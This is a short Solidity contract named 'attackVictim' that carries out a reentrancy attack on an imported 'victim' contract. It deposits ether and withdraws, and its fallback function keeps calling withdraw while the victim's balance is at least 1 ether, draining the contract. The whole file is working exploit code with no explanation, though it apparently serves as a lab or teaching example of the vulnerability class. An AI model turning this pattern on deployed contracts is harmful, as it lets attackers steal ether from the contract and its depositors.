pragma solidity ^0.7.0;
import "./victim.sol";
contract attackVictim{
    victim public victimContract;
    constructor(address _victimContractAddr) public{
        victimContract = victim(_victimContractAddr);
    }

    fallback() external payable{
        if(address(victimContract).balance >= 1 ether)
        {
        victimContract.withdraw(1 ether);
        }
    }

    function attack() public payable{
        victimContract.deposit{value: msg.value}();
        victimContract.withdraw(1 ether);
    }
}
